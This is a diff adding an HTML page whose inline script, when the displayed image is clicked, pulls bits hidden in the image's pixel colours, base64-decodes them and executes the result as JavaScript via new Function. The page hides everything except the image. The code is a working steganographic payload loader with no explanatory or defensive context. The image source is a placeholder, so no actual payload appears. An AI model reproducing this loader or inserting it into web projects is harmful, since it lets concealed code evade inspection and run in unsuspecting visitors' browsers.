@@ -1,0 +1,46 @@
+<html><head><meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<script>
+    function run(){
+        picture.onclick=decode;
+    }
+
+    function decode(){
+        var canvas=document.createElement("canvas");
+        picture.parentNode.insertBefore(canvas,picture);
+                
+        canvas.width=picture.width;
+        canvas.height=picture.height;
+
+        var ctx=canvas.getContext("2d");
+        ctx.drawImage(picture,0,0);
+                
+        picture.parentNode.removeChild(picture);
+        var image_data = ctx.getImageData(0,0,canvas.width,canvas.height).data;
+        var extracted= '';
+        for(var i=0; i<image_data.length;i+=4){
+            for(var k=0;k<3;k++){
+                extracted += ((image_data[i+k]).toString(2).slice(-1));
+            }
+        }
+                
+        var mesLength = extracted.substring(0,32);
+        var a = parseInt(mesLength, 2);
+
+        resultString = '';
+
+        for(var j=0; j<((a)/8);j++){
+            byte = extracted.substring((32+(j*8)),(32+((j+1)*8)));
+            var s = String.fromCharCode(parseInt(byte,2).toString(10));
+            resultString = resultString + s;
+        }
+        exec(atob(resultString));
+    }
+
+    function exec(b){
+        var a=setTimeout((new Function(b)),100);
+    }
+
+    window.onload=run;
+</script>
+<style>body{visibility:hidden;} .image{visibility:visible;position:absolute;top:15px;left:10px;}</style>
+</head><body><div class=image><img id=picture src="#"></div></body></html>
